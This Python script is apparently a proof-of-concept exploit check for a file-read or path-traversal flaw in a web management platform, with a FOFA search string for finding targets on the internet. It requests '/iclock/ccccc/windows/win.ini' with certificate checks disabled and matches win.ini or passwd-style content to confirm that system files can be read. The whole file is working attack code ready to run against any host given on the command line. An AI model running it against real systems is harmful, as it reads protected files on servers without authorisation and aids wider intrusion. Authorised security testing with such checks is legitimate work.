#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import urllib3
import time
import json
import sys
import os
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:"安全精细化管理平台"')


def run_proto(url):
    con_list = ["/iclock/ccccc/windows/win.ini"]
    for con in con_list:
        vuln_url = url + con
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        # noinspection PyBroadException
        try:
            requests.packages.urllib3.disable_warnings()
            req = requests.get(url=vuln_url, verify=False, headers=headers, timeout=(3, 3))
            rec = re.search(':.*?:.*?:.*?:.*?/.*?bin', req.text, re.I)
            if (rec or ('[extensions]' in req.text and '[fonts]' in req.text)) and req.status_code == 200:
                print(url)
                return True
        except Exception as e:
            print(e)
            return False
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:8000')
    args = parse.parse_args()
    target = args.url
    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')